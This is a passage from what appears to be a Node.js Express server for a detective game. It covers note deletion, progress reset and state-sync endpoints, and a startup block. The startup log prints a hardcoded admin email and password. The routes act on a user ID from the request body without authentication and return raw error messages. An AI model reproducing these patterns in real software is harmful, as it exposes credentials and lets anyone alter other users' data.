    res.status(500).json({ message: error.message });
  }
});

// ===== 29. DELETE NOTE FOR LEVEL 2 =====
app.post('/api/level2progresses/delete-note', async (req, res) => {
  try {
    const { userId, noteId, discoveryId, xpLost } = req.body;

    if (userId === 'admin') {
      return res.json({ message: 'Admin note not deleted' });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ message: 'Invalid user ID' });
    }

    let progress = await Level2Progress.findOne({ userId });
    
    if (!progress) {
      return res.status(404).json({ message: 'Progress not found' });
    }

    const updatedNotes = progress.notes.filter(n => n.id !== noteId);
    
    let updatedDiscoveries = [...progress.discoveries];
    let updatedXP = progress.xpEarned;

    if (discoveryId) {
      const otherNotesWithSameDiscovery = updatedNotes.some(n => 
        n.title && n.title.includes('DISCOVERY:') && 
        n.title.includes(discoveryId.toString())
      );
      
      if (!otherNotesWithSameDiscovery) {
        updatedDiscoveries = updatedDiscoveries.filter(id => id !== discoveryId);
        updatedXP = Math.max(0, updatedXP - (xpLost || 0));
      }
    }

    progress.notes = updatedNotes;
    progress.discoveries = updatedDiscoveries;
    progress.xpEarned = updatedXP;
    progress.lastAccessed = new Date();
    
    await progress.save();

    res.json({
      success: true,
      discoveries: progress.discoveries,
      xpEarned: progress.xpEarned,
      notes: progress.notes,
      message: "Note deleted successfully"
    });

  } catch (error) {
    console.error('❌ Error deleting note:', error);
    res.status(500).json({ message: error.message });
  }
});

// ===== 30. RESET LEVEL 1 PROGRESS COMPLETELY =====
app.post('/api/level1progresses/reset-complete', async (req, res) => {
  try {
    const { userId } = req.body;

    if (userId === 'admin') {
      return res.json({ message: 'Admin reset (no action)' });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ message: 'Invalid user ID' });
    }

    await Level1Progress.findOneAndDelete({ userId });
    
    await User.findByIdAndUpdate(userId, {
      'gameProgress.case101': { discoveries: [], xp: 0, notes: [], completed: false, completedAt: null, accuracy: 0 }
    });

    const newProgress = new Level1Progress({
      userId,
      startedAt: new Date(),
      status: 'in-progress',
      discoveries: [],
      xpEarned: 0,
      notes: [],
      lastAccessed: new Date(),
      attempts: 1,
      completedAt: null,
      accuracy: 0
    });

    await newProgress.save();

    console.log(`✅ Level 1 completely reset for user ${userId}`);

    res.json({ 
      success: true, 
      message: 'Level 1 progress completely reset',
      reset: true 
    });

  } catch (error) {
    console.error('❌ Error resetting level:', error);
    res.status(500).json({ message: error.message });
  }
});

// ===== 31. RESET LEVEL 2 PROGRESS COMPLETELY =====
app.post('/api/level2progresses/reset-complete', async (req, res) => {
  try {
    const { userId } = req.body;

    if (userId === 'admin') {
      return res.json({ message: 'Admin reset (no action)' });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ message: 'Invalid user ID' });
    }

    await Level2Progress.findOneAndDelete({ userId });
    
    await User.findByIdAndUpdate(userId, {
      'gameProgress.case102': { discoveries: [], xp: 0, notes: [], completed: false, completedAt: null, accuracy: 0 }
    });

    const newProgress = new Level2Progress({
      userId,
      startedAt: new Date(),
      status: 'in-progress',
      discoveries: [],
      xpEarned: 0,
      notes: [],
      lastAccessed: new Date(),
      attempts: 1,
      completedAt: null,
      accuracy: 0
    });

    await newProgress.save();

    res.json({ 
      success: true, 
      message: 'Level 2 progress completely reset',
      reset: true 
    });

  } catch (error) {
    console.error('❌ Error resetting level:', error);
    res.status(500).json({ message: error.message });
  }
});

// ===== 32. SYNC FULL STATE - LEVEL 1 =====
app.post('/api/level1progresses/sync-state', async (req, res) => {
  try {
    const { userId, notes, discoveries, xpEarned, status } = req.body;

    if (userId === 'admin') {
      return res.json({ message: 'Admin state not synced' });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ message: 'Invalid user ID' });
    }

    const uniqueDiscoveries = discoveries || [];
    const correctXP = uniqueDiscoveries.length * 15;

    const progress = await Level1Progress.findOneAndUpdate(
      { userId },
      { 
        $set: { 
          notes: notes || [], 
          discoveries: uniqueDiscoveries, 
          xpEarned: correctXP,
          status: status || 'in-progress', 
          lastAccessed: new Date() 
        } 
      },
      { 
        returnDocument: 'after',
        upsert: true, 
        setDefaultsOnInsert: true 
      }
    );

    res.json({ 
      success: true, 
      discoveries: progress.discoveries, 
      xpEarned: progress.xpEarned,
      notes: progress.notes, 
      message: "State synced successfully" 
    });

  } catch (error) {
    console.error('❌ Error syncing state:', error);
    res.status(500).json({ message: error.message });
  }
});

// ===== 33. SYNC FULL STATE FOR LEVEL 2 =====
app.post('/api/level2progresses/sync-state', async (req, res) => {
  try {
    const { userId, notes, discoveries, xpEarned, status } = req.body;

    if (userId === 'admin') {
      return res.json({ message: 'Admin state not synced' });
    }

    if (!mongoose.Types.ObjectId.isValid(userId)) {
      return res.status(400).json({ message: 'Invalid user ID' });
    }

    const uniqueDiscoveries = discoveries || [];
    const correctXP = uniqueDiscoveries.length * 15;

    const progress = await Level2Progress.findOneAndUpdate(
      { userId },
      { 
        $set: { 
          notes: notes || [], 
          discoveries: uniqueDiscoveries, 
          xpEarned: correctXP,
          status: status || 'in-progress', 
          lastAccessed: new Date() 
        } 
      },
      { 
        returnDocument: 'after',
        upsert: true, 
        setDefaultsOnInsert: true 
      }
    );

    res.json({ 
      success: true, 
      discoveries: progress.discoveries, 
      xpEarned: progress.xpEarned,
      notes: progress.notes, 
      message: "State synced successfully" 
    });

  } catch (error) {
    console.error('❌ Error syncing state:', error);
    res.status(500).json({ message: error.message });
  }
});

// ===== 34. START SERVER =====
const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 ===========================================');
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📊 Using database: crimesolver`);
    console.log(`📊 Collections: level1progresses, level2progresses`);
    console.log('🔵 Admin login: admin@crimesolver.com / admin123');
    console.log('🟢 Regular users: Any registered email from database');
    console.log('➕ Add Note API: /api/level1progresses/add-note (FIXED)');
    console.log('📓 Get Notes API: /api/level1progresses/notes/:userId');
    console.log('🗑️ Delete Note API: /api/level1progresses/delete-note');
    console.log('🔄 Reset API: /api/level1progresses/reset-complete');
    console.log('🔄 Sync API: /api/level1progresses/sync-state');
    console.log('🔍 Debug API: /api/debug/collection');
    console.log('🧪 Test API: /api/test');
    console.log('🚀 ===========================================');
});